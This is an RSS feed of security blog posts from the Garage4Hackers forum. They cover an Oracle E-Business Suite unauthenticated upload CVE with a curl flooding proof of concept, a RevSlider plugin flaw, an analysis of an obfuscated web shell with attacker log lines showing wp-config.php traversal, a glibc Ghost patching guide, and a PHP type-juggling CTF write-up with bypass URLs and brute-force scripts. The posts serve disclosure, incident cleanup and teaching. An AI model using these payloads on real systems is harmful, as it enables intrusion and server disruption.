<?xml version="1.0" encoding="ISO-8859-1"?>

<rss version="2.0" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/">
	<channel>
		<title><![CDATA[Garage4hackers Forum - Blogs - [s]]]></title>
		<link>http://garage4hackers.com/blog.php?u=238</link>
		<description>Garage4Hackers(G4H) is an open security community for Information Security enthusiasts, gurus and aspirants.Members of the team dedicate time and resources towards helping other information security aspirants, sharing knowledge,spreading security awareness and promoting research.</description>
		<language>en</language>
		<lastBuildDate>Sun, 22 Mar 2020 10:25:17 GMT</lastBuildDate>
		<generator>vBulletin</generator>
		<ttl>60</ttl>
		<image>
			<url>http://garage4hackers.com/images/misc/rss.jpg</url>
			<title><![CDATA[Garage4hackers Forum - Blogs - [s]]]></title>
			<link>http://garage4hackers.com/blog.php?u=238</link>
		</image>
		<item>
			<title>CVE-2015-2652 – Unauthenticated File Upload in Oracle E-business Suite.</title>
			<link>http://garage4hackers.com/entry.php?b=3130</link>
			<pubDate>Mon, 20 Jul 2015 13:56:47 GMT</pubDate>
			<description><![CDATA[---Quote (Originally by [s])--- 
During my regular job, I unravelled an interesting vulnerability of Unauthenticated File Upload in Oracle E-business...]]></description>
			<content:encoded><![CDATA[<blockquote class="blogcontent restore"><div class="bbcode_container">
	<div class="bbcode_quote">
		<div class="quote_container">
			<div class="bbcode_quote_container"></div>
			
				<div class="bbcode_postedby">
					<img src="images/misc/quote_icon.png" alt="Quote" /> Originally Posted by <strong>[s]</strong>
					<a href="showthread.php?p=14311#post14311" rel="nofollow"><img class="inlineimg" src="images/buttons/viewpost-right.png" alt="View Post" /></a>
				</div>
				<div class="message">During my regular job, I unravelled an interesting vulnerability of Unauthenticated File Upload in Oracle E-business Suite 0-day vulnerability. This particular Upload Bug can be easily used to upload files on the web-server and also an attacker can flood the hard-disk of the server,thus making it easier for an attacker to leverage the vulnerability remotely.<br />
<br />
Oracle released Critical Patch Update containing security fixes for the Oracle E-Business Suite. This vulnerability is remotely exploitable without requiring any kind of authentication , i.e. exploited over the network without the need for any valid username credentials.<br />
<br />
<b>Introduction</b><br />
<br />
Oracle E-Business Suite is a fully integrated, comprehensive suite of business applications for the enterprise. Following purposes most of organization uses Oracle E-business.<br />
<br />
    Customer Relationship Management<br />
    Financial Management<br />
    Financial Management<br />
    Human Capital Management<br />
    Project Portfolio Management<br />
    Advanced Procurement<br />
    Supply Chain Management<br />
    Service Management<br />
<br />
<b>Vulnerable Version</b><br />
<br />
Oracle E-Business Suite, version(s) 11.5.10.2, 12.0.6, 12.1.1, 12.1.2, 12.1.3, 12.2.3, 12.2.4<br />
<br />
<b>Brief About bug</b><br />
<br />
The unauthenticated upload vulnerability resides in Oracle Marketing component.  If you search in Google for Oracle E-business, you will find more than 30K unique search results.<br />
<br />
The file is uploaded into a table in the E-Business Suite database schema.  The attacker,however, can use it to fill up the existing table space. Upload functionality allows the attacker to upload any arbitrary file types(All executables) and also allows to execute the uploaded code.<br />
<br />
POC Raw code for feeding files files to server to :<br />
<br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code"style="height:108px;">for ($x=1; $x &lt; 100; $x++):
curl -i -s -k  -X 'POST' \
    -H 'Origin: http://Oracle-Application:Port' -H 'User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36' -H 'Content-Type: multipart/form-data; boundary=----WebKitFormBoundarywS9xiTn7rP23Fori' -H 'Referer: http://Oracle-Application:Port/OA_HTML/amsImageSelect.jsp' \
    -b 'JSESSIONID=6e66b3f234234234272c18909d2bca0c96bf7c.kdsnfksjdfn34rk32; PROD_pses=PROD%3DHcqumhXKzuUX0xNEIjoeFKu8hZ%7E; PROD=HcqumhXKzuUX0xNEIjoeFKu8hZ; oracle.uix=0^^GMT+4:00^p' \
    --data-binary $'------WebKitFormBoundarywS9xiTn7rP23Fori\x0d\x0aContent-Disposition: form-data; name=\&quot;type\&quot;\x0d\x0a\x0d\x0aF\x0d\x0a------WebKitFormBoundarywS9xiTn7rP23Fori\x0d\x0aContent-Disposition: form-data; name=\&quot;FileInput\&quot;; filename=\&quot;Check.txt\&quot;\x0d\x0aContent-Type: text/plain\x0d\x0a\x0d\x0a\x0d\x0a------WebKitFormBoundarywS9xiTn7rP23Fori\x0d\x0aContent-Disposition: form-data; name=\&quot;fileId\&quot;\x0d\x0a\x0d\x0anull\x0d\x0a------WebKitFormBoundarywS9xiTn7rP23Fori\x0d\x0aContent-Disposition: form-data; name=\&quot;url\&quot;\x0d\x0a\x0d\x0a\x0d\x0a------WebKitFormBoundarywS9xiTn7rP23Fori--\x0d\x0a' \
    'http://Oracle-Application:Port//OA_HTML/amsImageUpload.jsp?dummy=1&amp;jttst0=6_22646%2C22646%2C-1%2C0%2C&amp;jtfm0=&amp;etfm1=&amp;jfn=ZG01DFBB7BC079CDE282F4716CF2E5B140454CA599F18AD7A2CAD711D30D5FB60DF18438A1D10EB7BD7CF1370CF9D979BDA7&amp;oas=ddrqZePQ82zVbJrUIG7jrw..&amp;JSSetFunctionName=null&amp;elemName=null'
end for;</pre>
</div><b>Vulnerability Information</b><br />
<br />
By using the following URLs the attacker can use it to upload files on the server.<br />
<br />
<a href="http://ORACLE-WebServer:Port/OA_HTML/amsImageSelect.jsp" target="_blank">http://ORACLE-WebServer:Port/OA_HTML/amsImageSelect.jsp</a><br />
<a href="http://ORACLE-WebServer:Port/OA_HTML/amsImageUpload.jsp" target="_blank">http://ORACLE-WebServer:Port/OA_HTML/amsImageUpload.jsp</a><br />
<br />
Oracle E-business-vulnerability<br />
<br />
For the security reasons we are not releasing uploaded file path.<br />
<br />
<b>Timeline</b><br />
<br />
May 7, 2015 :  Identification of the vulnerability<br />
May 8, 2015 :  Reported to the Oracle Security Team<br />
May 12, 2015: Confirmed Upload Vulnerability in Oracle E-business<br />
May 22, 2015 :Upload Vulnerability Patched<br />
May 22, 2015 : CPU Scheduled for Critical Update<br />
July 13, 2015 : CVE Allocated CVE-2015-2652<br />
July 14, 2015 : Critical Update Pushed<br />
July 15, 2015 : Vulnerability Made Public<br />
<br />
<b>Mitigation</b><br />
<br />
Update Oracle E-business Suit to latest version.<br />
<br />
Source: <a href="http://blog.securelayer7.net/cve-2015-2652-unauthenticated-file-upload-in-oracle-e-business-suite/" target="_blank">http://blog.securelayer7.net/cve-201...usiness-suite/</a></div>
			
		</div>
	</div>
</div></blockquote>

]]></content:encoded>
			<dc:creator><![CDATA[[s]]]></dc:creator>
			<guid isPermaLink="true">http://garage4hackers.com/entry.php?b=3130</guid>
		</item>
		<item>
			<title>WordPress Plugin – Revslider update captions CSS file critical vulnerability</title>
			<link>http://garage4hackers.com/entry.php?b=3122</link>
			<pubDate>Fri, 27 Mar 2015 18:04:55 GMT</pubDate>
			<description>Today being another day at work for SecureLayer7 to recover our client’s defaced website, and bang I think I hit upon a nasty vulnerability of a...</description>
			<content:encoded><![CDATA[<blockquote class="blogcontent restore">Today being another day at work for SecureLayer7 to recover our client’s defaced website, and bang I think I hit upon a nasty vulnerability of a famous plugin.<br />
<br />
Although we successfully patched the vulnerability and we fixed the undoing of the blacklisting. On further research I stumbled upon its usage over the internet and as it turns out large number of web users online are affected, putting them to greater risk if not mitigated with a proper patch or an update.<br />
<br />
Following URL is vulnerable to update CSS.<br />
<br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code"style="height:36px;">wp-admin/admin-ajax.php?action=revslider_ajax_action&amp;client_action=get_captions_css</pre>
</div>You can test your website by executing this python <a href="http://pastebin.com/4dVDQcQs" target="_blank">code</a><br />
<br />
After I started digging for the root cause as to what is exactly triggering the bug.  I figured that there is a class file called as revslider_admin.php in the Revslider Plugin folder, where you can find onAjaxAction() function which is actually triggering bug.<br />
<br />
<img src="http://blog.securelayer7.net/wp-content/uploads/2015/03/11.png" border="0" alt="" /><br />
<br />
There is switch call where it is calling another function called as <b>updateCaptionsContentData()</b> as shown in the bellow image .<br />
<br />
<img src="http://blog.securelayer7.net/wp-content/uploads/2015/03/reve_admin.png" border="0" alt="" /><br />
<br />
The updateCaptionsContentData() function is located into inc_php/revslider_operations.class.php , where is the actual cause of bug as you can see writeFile function which is writing content in the file.<br />
<br />
<img src="http://blog.securelayer7.net/wp-content/uploads/2015/03/revslider_operations.class.png" border="0" alt="" /><br />
<br />
You can patch this bug by installing Latest version of Revslide builder. <br />
<br />
<br />
Reference : <a href="http://blog.securelayer7.net/wordpress-plugin-revslider-update-captions-css-file-critical-vulnerability/" target="_blank">http://blog.securelayer7.net/wordpre...vulnerability/</a></blockquote>


<!-- attachments -->
	<div class="blogattachments">
		
		
			<fieldset class="blogcontent">
				<legend>Attached Images</legend>
				
			</fieldset>
		
		
		

	</div>
<!-- / attachments -->
]]></content:encoded>
			<dc:creator><![CDATA[[s]]]></dc:creator>
			<guid isPermaLink="true">http://garage4hackers.com/entry.php?b=3122</guid>
		</item>
		<item>
			<title>Malware Cleanup: Analysis of an Undetectable web-shell code uploaded, RevSlider bug</title>
			<link>http://garage4hackers.com/entry.php?b=3112</link>
			<pubDate>Mon, 09 Mar 2015 15:43:21 GMT</pubDate>
			<description>I started my day with my regular *Malware Cleanup* activity and came across an interesting *backdoor *web shell file on the server.  The server is...</description>
			<content:encoded><![CDATA[<blockquote class="blogcontent restore">I started my day with my regular <b>Malware Cleanup</b> activity and came across an interesting <b>backdoor </b>web shell file on the server.  The server is not specific to any particular environment, it was one of the regularly updated WordPress package with the plugin RevSlider Plugin ver. 4.1.4 . <br />
<br />
I initiated the process to detect the backdoors and web malwares, and got a hit on a malicious .htaccess file which was redirecting hxxp://m.mobi-avto.ru as shown below:<br />
<br />
<img src="http://blog.securelayer7.net/wp-content/uploads/2015/03/1-300x88.png" border="0" alt="" /><br />
<br />
I immediately started the mitigation process to remove and clean the malicious .htaccess file and in the process created backup of all files. Upon further investigation and some digging into other files from server, I ended up inspecting all files on the server using the the following method:<br />
<br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code"style="height:36px;">find ./ \( -regex '.*\.php$' -o -regex '.*\.inc$' \) -print0 | xargs -0 egrep -il &quot;$shellPaterns&quot; | sort &gt; shellPaterns.txt</pre>
</div>and I also incorporated different techniques to detect any possible web shell and back-doors, for more techniques visit <a href="http://garage4hackers.com/showthread.php?t=987" target="_blank">here </a>and at last , I got a hit on a web shell code .<br />
<br />
<img src="http://blog.securelayer7.net/wp-content/uploads/2015/03/webshell-code-300x99.png" border="0" alt="" /><br />
<br />
The beauty of this shell code is that it was completely undetectable to all the anti-viruses. If we dissect the total code we found that, it was encoded with base64,  with reverse compressed format by using the following snippet:<br />
<br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code"style="height:36px;">    $Laz_ep=@gzinflate(strrev($L_qmfd));</pre>
</div>On taking a closer look of it’s modus operandi ,we found that it was decoding entire encrypted web shellcode and in the next line it was sending commands to web-shell function for execution as you can see in the code. This coded webshell  was protected by authentication, it was asking password for accessing webshell.<br />
<br />
The code was completely encrypted and there was a static password stored in the script to access the webshell. I started analyzing the script and tried to decrypt the web shellcode.<br />
<br />
I found following statement suspicious :<br />
<br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code"style="height:36px;"> $V_ibc(&quot;7l3rbp1c9a7d1l0i5oby5u3n6a6sdj3b0w0pbjctacbc1oazbeak3d5pfcba9vbx&quot;);</pre>
</div>It might be snippet which is password to web shell authentication function.<br />
<br />
After couple of minutes into my research I finally found that this is the only function which is responsible for the authentication and I wrote following code to decrypt it :<br />
<br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code"style="height:36px;">7l3rbp1c9a7d1l0i5oby5u3n6a6sdj3b0w0pbjctacbc1oazbeak3d5pfcba9vbx</pre>
</div><img src="http://blog.securelayer7.net/wp-content/uploads/2015/03/decoding-of-md5hash-300x58.png" border="0" alt="" /><br />
<br />
So here actually the webshell (wso version 2.8) is storing Password in MD5 (73b197105b5366d300bcab1aba35fb9b) , if you just search md5 hash on Google you will find the plain text. You can find php code <a href="https://ideone.com/jGxh1w" target="_blank">here</a><br />
<br />
Details for the webshell, check out detection rate and analysis <a href="https://www.virustotal.com/en/file/2ed92600c1e2baa9435a87fdf73807084242d0da2016362bcd0804bfa3f285a0/analysis/1425891499/" target="_blank">here </a>:<br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code"style="height:84px;">MD5  : dba5a9a19f240a217b04003ac7084bb3
SHA1 : 28b399288497463f290e73bb8fca27be42de6095
SHA256 : 2ed92600c1e2baa9435a87fdf73807084242d0da2016362bcd0804bfa3f285a0
ssdeep 384:g7ECACT88nrR6og+cFz0ezXx0xSIZ3BLbMHMjRmgUR1RYsyOgDsephg4Hn8Wl:gBPokVfeFB7KAIZxf+fesyOks+hgOp
File size 24.7 KB ( 25259 bytes )</pre>
</div>The curious question here is that from where did the attacker uploaded the webshell and accessed the entire server?? I started checking all external plugins installations and after digging into the access.log and error.log, got the following findings:<br />
<br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code"style="height:60px;">134.249.53.85 - - [04/Mar/2015:00:44:22 +0530] &quot;GET /wp-admin/admin-ajax.php?action=revslider_show_image&amp;img=../wp-config.php HTTP/1.1&quot; 200 3448 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 6.1; rv:37.0) Gecko/20100101 Firefox/37.0&quot;
134.249.53.85 - - [04/Mar/2015:00:44:23 +0530] &quot;POST /wp-content/plugins/wp-symposium/server/php/index.php HTTP/1.1&quot; 404 1417 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 6.1; rv:37.0) Gecko/20100101 Firefox/37.0&quot;
134.249.53.85 - - [04/Mar/2015:00:44:25 +0530] &quot;GET /wp-content/plugins/wp-symposium/server/php/kcEgkjtkpykvzG.php HTTP/1.1&quot; 404 1417 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 6.1; rv:37.0) Gecko/20100101 Firefox/37.0&quot;</pre>
</div>The spotlight was on RevSlider Plugin ver. 4.1.4, and it was a vulnerable plugin, where the attacker can read the files on the server. The Attacker managed to access the web config file of the wordpress and gained  further access.   This is how I saved the day and <a href="http://securelayer7.net/malware-removal-service" target="_blank">cleaned up malware, web mailers</a> , backdoor and other malicious filefrom the website.<br />
<br />
References : <a href="http://blog.securelayer7.net/malware-cleanup-analysis-of-undetectable-web-shell-code-uploaded-via-revslider-vulnerability/" target="_blank">http://blog.securelayer7.net/malware...vulnerability/</a></blockquote>

]]></content:encoded>
			<dc:creator><![CDATA[[s]]]></dc:creator>
			<guid isPermaLink="true">http://garage4hackers.com/entry.php?b=3112</guid>
		</item>
		<item>
			<title>CVE-2015-0235 – How to secure against Glibc Ghost Vulnerability</title>
			<link>http://garage4hackers.com/entry.php?b=3106</link>
			<pubDate>Thu, 29 Jan 2015 04:43:25 GMT</pubDate>
			<description>CVE-2015-0235 Ghost (glibc gethostbyname buffer overflow) Vulnerability is serious cause for all Linux servers. This vulnerability leveraged to...</description>
			<content:encoded><![CDATA[<blockquote class="blogcontent restore">CVE-2015-0235 Ghost (glibc gethostbyname buffer overflow) Vulnerability is serious cause for all Linux servers. This vulnerability leveraged to execute remote and  code execution on the victim Linux server. The vulnerability found By Qualys Researcher and patched in GNU.<br />
<br />
<b>What is the cause ?</b><br />
<br />
The bug is in __nss_hostname_digits_dots() function of function of the GNU C Library (glibc), and location of the path is file for  non-reentrant version is nss/getXXbyYY.c , which is used by the gethostbyname().  The vulnerability can be exploited both via locally and remotely.  In order to trigger this vulnerability attacker needs to be able to feed specially crafted 'host name' to the service. And service needs to process it without validating it first.<br />
<br />
<b>Following are the potentially exploitable services</b><br />
<br />
    procmail<br />
    Exim<br />
    pppd<br />
    clockdiff<br />
<br />
You can find the list of services which are rely on the GNU C libraries by executing following command<br />
<br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code"style="height:36px;">lsof | grep libc | awk '{print $1}' | sort | uni</pre>
</div><b>Fix for Centos/RHEL/Fedora 5,6,7</b><br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code"style="height:48px;">yum update glibc 
sudo restart</pre>
</div><b>Fix for Ubuntu</b><br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code"style="height:60px;">sudo apt-get update
sudo apt-get dist-upgrade
sudo restart</pre>
</div>For Quick test , you can run this <a href="http://pastebin.com/x9QHgxED" target="_blank">code</a><br />
<br />
Reference : <br />
<a href="http://www.openwall.com/lists/oss-security/2015/01/27/9" target="_blank">http://www.openwall.com/lists/oss-security/2015/01/27/9</a><br />
<a href="http://blog.securelayer7.net/cve-2015-0235-how-to-secure-against-glibc-ghost-vulnerability/" target="_blank">http://blog.securelayer7.net/cve-201...vulnerability/</a></blockquote>

]]></content:encoded>
			<dc:creator><![CDATA[[s]]]></dc:creator>
			<guid isPermaLink="true">http://garage4hackers.com/entry.php?b=3106</guid>
		</item>
		<item>
			<title>Garage4Hackers Year 2014 Timeline Presentation</title>
			<link>http://garage4hackers.com/entry.php?b=3099</link>
			<pubDate>Wed, 31 Dec 2014 03:09:29 GMT</pubDate>
			<description><![CDATA[---Quote (Originally by [s])--- 
https://www.youtube.com/watch?v=gNNropK0L_8 
---End Quote---]]></description>
			<content:encoded><![CDATA[<blockquote class="blogcontent restore"><div class="bbcode_container">
	<div class="bbcode_quote">
		<div class="quote_container">
			<div class="bbcode_quote_container"></div>
			
				<div class="bbcode_postedby">
					<img src="images/misc/quote_icon.png" alt="Quote" /> Originally Posted by <strong>[s]</strong>
					<a href="showthread.php?p=13692#post13692" rel="nofollow"><img class="inlineimg" src="images/buttons/viewpost-right.png" alt="View Post" /></a>
				</div>
				<div class="message"><iframe class="restrain" title="YouTube video player" width="640" height="390" src="//www.youtube.com/embed/gNNropK0L_8?wmode=opaque" frameborder="0"></iframe></div>
			
		</div>
	</div>
</div></blockquote>

]]></content:encoded>
			<dc:creator><![CDATA[[s]]]></dc:creator>
			<guid isPermaLink="true">http://garage4hackers.com/entry.php?b=3099</guid>
		</item>
		<item>
			<title>Writeup on Garage4Hackers Xmas / Dec Web Challenge 2014</title>
			<link>http://garage4hackers.com/entry.php?b=3094</link>
			<pubDate>Wed, 10 Dec 2014 14:48:40 GMT</pubDate>
			<description><![CDATA[---Quote (Originally by [s])--- 
Ho Ho Ho, Xmas challenge ended. This challenge was all about of bypassing login authentication. Obviously, it was...]]></description>
			<content:encoded><![CDATA[<blockquote class="blogcontent restore"><div class="bbcode_container">
	<div class="bbcode_quote">
		<div class="quote_container">
			<div class="bbcode_quote_container"></div>
			
				<div class="bbcode_postedby">
					<img src="images/misc/quote_icon.png" alt="Quote" /> Originally Posted by <strong>[s]</strong>
					<a href="showthread.php?p=13667#post13667" rel="nofollow"><img class="inlineimg" src="images/buttons/viewpost-right.png" alt="View Post" /></a>
				</div>
				<div class="message">Ho Ho Ho, Xmas challenge ended. This challenge was all about of bypassing login authentication. Obviously, it was funny challenge!! And the obvious reason was password md5 hash. A footnote was there in source code. <br />
<br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code"style="height:108px;">&lt;!-- 
    We are so generous, see we provided you password hash to login :) 0e100132199235687421930375421091
    if(0e100132199235687421930375421091 == md5($_GET['pass']))
    {
      // Simple PHP CODE Logic 
    }
  ?&gt; --&gt;</pre>
</div>Garage4Hackers Xmass Challenge is developed into PHP and it available to <a href="https://dl.dropboxusercontent.com/u/18007092/G4HxMassEventChall.php" target="_blank">download</a> for learning purpose. <br />
<br />
Just a quick note: If you want to join G4H CTF team, then you PM me and checkout our last month <a href="https://www.youtube.com/watch?v=Xoi5GxcD_Lg" target="_blank">Ranchoddas event</a> :) <br />
<br />
And I'm back to business, The main purpose of the CTF is to understand the PHP equal to (==) operator for comparing and even you can study <a href="http://php.net/manual/en/function.strcmp.php" target="_blank">strcmp </a>function.  If a developer uses equal to (==) operator without measuring the risk, then it can be profitable for attacker. However, attack can be carried in rare cases only. we've received some expected result and some unexpected results but at the end both are results ;) <br />
<br />
There was 4k + unique Hits on the CTF page in 24 Hrs, only few submission we've valid received. <br />
<br />
Following is list of ninja, who solved the challenge in the time. <br />
 <br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code"style="height:96px;">jinmo123  - Good Solution but not expected
tlk ( https://twitter.com/tlk___ ) - Nice Solution, but Not expected
stypr (https://stypr.com) - W00tt , expected solution		
Ajin Abraham - Nice Solution, but Not expected
sagar popat  - Nice Solution, but Not expected
Sharath Unni - W00tt , expected solution</pre>
</div>There was three way to solve this CTF and expected way to solve the challenge is to bypass authentication by using PHP equal to (==) operator. Brute forcing username is second easy way to solve the challenge and last way was monkey testing. ( Just kidding ;) )<br />
<br />
<b>PHP CTF Code: </b><br />
<br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code"style="height:372px;">&lt;?php 
error_reporting(0);
$a = htmlentities($_GET['username']);  
$c = htmlentities($_GET['password']);
$b = md5($c);
if (!empty($a) AND !empty($b)) { // empty function made this CTF more easy
 if (&quot;0e100132199235687421930375421091&quot; == $b) { // vulnerable line
    if ($b ===&quot;0e100132199235687421930375421091&quot;) {  // To Avoiding some bugs and change behavior of CTF 
     if (&quot;133E-1337&quot; === $a) {// To Avoiding some bugs and change behavior of CTF 
        print &quot;Flag : Garage4H4x0rFlagPhpFlag1337&quot;;    
      }else{
        print &quot;umm!! nice try dude :), oops! you don't know username&quot;;
      }
    }else{
      if ($a ===&quot;0e100132199235687421930375421091&quot;) {// To Avoiding some bugs and change behavior of CTF 
       print &quot;umm!! nice try dude :), oops! &quot;;
      }else{
        if (&quot;133E-1337&quot; == $a) { // vulnerable line
          print &quot;Flag : Garage4H4x0rFlagPhpFlag1337&quot;;    
        }else{
          Print &quot;Wrong Username&quot;;      
        } 
    }
      }  
  }else{
    Print &quot;wrong  Password&quot;;
  }  
}
?&gt;</pre>
</div>Here is some story about PHP operator and expected Behavior of PHP equal to operator. <br />
<br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code"style="height:84px;">Input       | Output
-------------------------
&quot;0&quot; == &quot;0&quot; | True
&quot;1&quot; == &quot;0&quot; | False 
-------------------------</pre>
</div><br />
Unexpected Behavior of PHP equal to operator. <br />
<br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code"style="height:72px;">Input       | Output
-------------------------
&quot;0e1&quot; == &quot;0&quot; | True
-------------------------</pre>
</div>In detailed : <br />
<b>PHP consider it as scientific notation 0e1 = 0 * 10 ^ 1 and ANS is 0</b><br />
<br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code"style="height:60px;"> &lt;?php 
   var_dump(&quot;0e1&quot; == 0);
 ?&gt;</pre>
</div><div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code"style="height:180px;">Finding entry points
Branch analysis from position: 0
Return found
filename:       /in/Pvj4s
function name:  (null)
number of ops:  4
compiled vars:  none
line     # *  op                           fetch          ext  return  operands
---------------------------------------------------------------------------------
   2     0  &gt;   IS_EQUAL                                         ~0      '0e1', 0
         1      SEND_VAL                                                 ~0
         2      DO_FCALL                                      1          'var_dump'
         3    &gt; RETURN                                                   1</pre>
</div>Here is the fun start, this is just plain text comparison and check out the following MD5 Hash, and most of developer use it as passwords. <br />
<br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code"style="height:48px;">var_dump(0e100132199235687421930375421091 == md5(urldecode('%02%a27%84')));
 bool(true) // w00t :)</pre>
</div>Another string : <div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code"style="height:36px;">'\x98-\xde\x1f'</pre>
</div>    // Submission by Beched (@ahack_ru)<br />
<br />
try here : <a href="http://3v4l.org/NK5hp" target="_blank">http://3v4l.org/NK5hp</a><br />
<br />
In our check was too simple to bypass, because we haven't put quotes around the hash. It made it to be integer, which causes expression to be true with any hash, which does not start with [1-9].<br />
<br />
Here is bypass if we use quote around hash: <br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code"style="height:48px;">php &gt; var_dump('0e100132199235687421930375421091'==md5(&quot;\x0e\xd7\xb6\xea&quot;));   // Submission by Beched (@ahack_ru)
bool(true)</pre>
</div>Try here : <a href="http://3v4l.org/M9dpY" target="_blank">http://3v4l.org/M9dpY</a><br />
<br />
Here is another simple example, which can be found on the internet. <br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code"style="height:36px;">http://3v4l.org/2vrMi</pre>
</div>While testing this CTF there is MD5 collision found by Sharath Unni <br />
<br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code"style="height:48px;">0e100132199235687421930375421091 (Found in HTML source code )
0e104142395260374396839196939683 (MD5 collision )</pre>
</div>Both these hashes have the same plaintext equivalent: 26177715789 , you can decrypt MD5 here <div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code"style="height:36px;"> http://www.md5online.org/</pre>
</div> . <br />
<br />
This was all about PHP Equal operator, now what is solution of this CTF.<br />
<br />
Here is solution and you find many more ways: <br />
<br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code"style="height:60px;">http://162.208.48.16/?username=0e57640477961333848717747276704&amp;password=BRTKUJZ&amp;submit=Login&amp;debug=true
http://162.208.48.16/?username=0e1&amp;password=NOOPCJF&amp;submit=Login&amp;debug=true
http://162.208.48.16/?username=0e2&amp;password=26177715789&amp;submit=Login&amp;debug=true</pre>
</div><br />
<b>Submission by jinmo123  </b><br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code"style="height:36px;">http://162.208.48.16/?username=000&amp;password=240610708&amp;submit=Login#</pre>
</div><b>Submission by tlk ( <a href="https://twitter.com/tlk___" target="_blank">https://twitter.com/tlk___</a> ) </b><br />
<br />
Brute Force Script: <br />
<br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code"style="height:108px;">import requests
s = requests.session()
for i in range(255):
    r = s.get(&quot;http://162.208.48.16/?username=&quot;+chr(i)+&quot;&amp;password=QNKCDZO&amp;submit=Login&quot;)
    print len(r.content), chr(i), i, &quot;Wrong Username&quot; in r.content
We can see that only #, &amp; and 0 not contains &quot;Wrong Username&quot;. let's try to prepend '0' :
    r = s.get(&quot;http://162.208.48.16/?username=0&quot;+chr(i)+&quot;&amp;password=QNKCDZO&amp;submit=Login&quot;)</pre>
</div><div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code"style="height:36px;">http://162.208.48.16/?username=0.0&amp;password=QNKCDZO&amp;submit=Login</pre>
</div><b>Two Submission by stypr (<a href="https://stypr.com" target="_blank">https://stypr.com</a>) </b><br />
<br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code"style="height:48px;">http://162.208.48.16/?username=0e57640477961333848717747276704&amp;password=BRTKUJZ&amp;submit=Login&amp;debug=true
http://162.208.48.16/?username=0x00&amp;password=BRTKUJZ&amp;submit=Login&amp;debug=true</pre>
</div><b>Submission by Ajin Abraham</b><br />
<br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code"style="height:216px;">import urllib2
with open(&quot;10k most common.txt&quot;,&quot;r&quot;) as f:
    url='http://162.208.48.16/?username=[X]&amp;password=26177715789'
    no=0
    for line in f:
        turl=url.replace(&quot;[X]&quot;,line).replace(&quot;\n&quot;,&quot;&quot;).replace(&quot;\r&quot;,&quot;&quot;)
        response = urllib2.urlopen(turl)
        html = response.read()
        dat=html[:50]
        no+=1
        log= str(no)+&quot; Username: &quot;+ line +&quot;Response: &quot;+ dat
        if (&quot;Wrong&quot; in log):
            print no
        else:
            print log
response.close()</pre>
</div><div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code"style="height:36px;">URL:http://162.208.48.16/?username=-0&amp;password=26177715789</pre>
</div><b>Submission by Sagar Popat</b><br />
<br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code"style="height:36px;">http://162.208.48.16/?username=00&amp;password=26177715789&amp;submit=Login</pre>
</div><br />
<b>Submission by Sharath Unni </b><br />
<br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code"style="height:36px;">http://162.208.48.16/?username=0e12323&amp;password=26177715789&amp;submit=Login</pre>
</div>Thats all for today :) Thank you for reading .</div>
			
		</div>
	</div>
</div></blockquote>

]]></content:encoded>
			<dc:creator><![CDATA[[s]]]></dc:creator>
			<guid isPermaLink="true">http://garage4hackers.com/entry.php?b=3094</guid>
		</item>
		<item>
			<title>Garage4Hackers Ranchoddas Webcast on  In the DOM- no one will hear you scream By</title>
			<link>http://garage4hackers.com/entry.php?b=3085</link>
			<pubDate>Thu, 18 Sep 2014 10:14:16 GMT</pubDate>
			<description><![CDATA[---Quote (Originally by [s])--- 
Garage October month RWS series, our  rancho Author* Mario Heiderich* 
 
Title :  
In the DOM- no one will hear you...]]></description>
			<content:encoded><![CDATA[<blockquote class="blogcontent restore"><div class="bbcode_container">
	<div class="bbcode_quote">
		<div class="quote_container">
			<div class="bbcode_quote_container"></div>
			
